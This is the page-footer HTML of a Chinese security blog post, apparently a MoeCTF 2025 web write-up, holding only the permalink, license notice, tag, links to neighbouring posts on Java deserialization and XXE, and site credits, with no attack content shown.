      <strong>本文链接：</strong>
      <a href="https://wanth3f1ag.top/2025/09/21/MoeCTF2025web%E9%A2%98%E8%A7%A3(%E5%B7%B2%E5%81%9A%E5%AE%8C)/" title="MoeCTF2025web题解">https://wanth3f1ag.top/2025/09/21/MoeCTF2025web题解(已做完)/</a>
  </li>
  <li class="post-copyright-license">
      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
  </li>
</ul>
</div>

          <div class="post-tags">
              <a href="/tags/LitCTF2025/" rel="tag"># LitCTF2025</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2025/09/11/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96jdk8u20%E5%8E%9F%E7%94%9F%E9%93%BE/" rel="prev" title="Java反序列化之jdk8u20原生链">
                  <i class="fa fa-angle-left"></i> Java反序列化之jdk8u20原生链
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2025/09/25/%E5%9F%BA%E4%BA%8EJabref%E7%9A%84PR%E7%9A%84%E4%B8%80%E4%BA%9B%E7%8C%9C%E6%B5%8B/" rel="next" title="基于Jabref的PR的一些XXE猜测">
                  基于Jabref的PR的一些XXE猜测 <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 2024 – 
    <span itemprop="copyrightYear">2026</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">wanTh3flag</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="站点总字数">3.5m</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">52:36</span>
  </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div><script color="0,0,255" opacity="0.5" zIndex="-1" count="99" src="https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js"></script>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>

</body>
</html>
